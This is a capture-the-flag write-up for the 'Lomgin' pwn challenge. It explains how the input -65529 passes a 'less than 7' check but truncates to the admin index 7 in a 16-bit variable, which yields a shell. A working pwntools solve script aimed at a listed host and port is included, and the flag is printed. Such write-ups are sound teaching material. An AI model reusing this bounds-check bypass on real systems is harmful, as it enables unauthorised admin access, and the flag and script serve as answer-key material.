---
layout: challenge.njk
title: Lomgin
category: Pwn
author: faizath
flag: "Teknocom{C4nt_R34ch_Adm1n_Haha}"
flagTeaser: "Teknocom{C4nt_R34ch_Adm1n...}"
description: "This “top-notch” login system lets you pick a user by index — but aim for admin and an integer truncation bug hands you a shell. nc 38.47.176.164 3042"
tags: [pwn, integer-truncation, shell]
---

## Overview

We are given a login service called "Lomgin", reachable via `nc 38.47.176.164 3042`. The fastest way to grab the flag is to send a specific negative number when the program asks us to pick a user index. This number is deliberately chosen so that it passes the `< 7` validation, yet once it is stored in a 16-bit variable inside the program its value is truncated to `7`, making the application believe we picked the admin user. As soon as the admin status is active, the binary spawns a shell, letting us read the contents of `flag.txt` directly. The value we use is `-65529`, because the lowest 16 bits of that number are equal to `7`.

## Analysis

The starting point for the analysis is the program's input pattern: it asks us to "pick a user by index" with a limit of less than 7. Logically, this is meant to prevent the selection of index 7, which is the admin. However, the implementation stores the input into a 16-bit type, which is then used as an index after being converted to unsigned. This is the integer-truncation flaw. A negative signed number can have a 16-bit representation that is identical to the small number we actually want.

To target index 7, we choose the value `7 - 0x10000`, which yields `-65529`. When truncated to 16 bits, its value becomes `0x0007`, which equals `7`, while the initial check only sees that `-65529 < 7`, so the input passes.

## Exploitation

The practical exploitation is simple. With pwntools we wait for the prompt, then send the string `-65529\n`. After that the program prints "Welcome admin." and hands us an interactive shell. From this shell we can run commands such as `ls` to list files and then `cat flag.txt`. This flow is visible from the execution output, which shows a directory containing `flag.txt`, `get-flag`, and `pwn`, followed by a successful read of the flag file.

As proof, running the solve script logs us in as admin and opens a shell, and `cat flag.txt` then prints the flag.

```python
from pwn import *

# Default target (remote service from the prompt)
HOST = args.HOST or "38.47.176.164"
PORT = int(args.PORT or 3042)

context.log_level = args.LOG_LEVEL or "info"

def pick_index_for(target_idx: int) -> int:
  """
  Return a value that:
    1) Is strictly less than 7 (so it passes the check),
    2) But truncates to 'target_idx' when stored as a 16-bit unsigned.
  Using k = -1 works for any small target_idx.
  """
  return target_idx - 0x10000 # e.g., 7 -> -65529

def solve(io):
  # Wait for the prompt (be forgiving about exact wording/spacing)
  io.recvuntil(b": ")
  payload = str(pick_index_for(7)).encode() + b"\n"
  log.info(f"Sending index that truncates to 7: {payload.strip().decode()}")
  io.send(payload)

  # If the exploit worked, the binary prints "Welcome admin." and spawns /bin/sh.
  # Hand control to the user.
  io.interactive()

if __name__ == "__main__":
    if args.LOCAL:
        # Run the provided binary locally
        exe = "./Chall"
        io = process(exe)
    else:
        io = remote(HOST, PORT)

    solve(io)
```

## Flag

```
Teknocom{C4nt_R34ch_Adm1n_Haha}
```
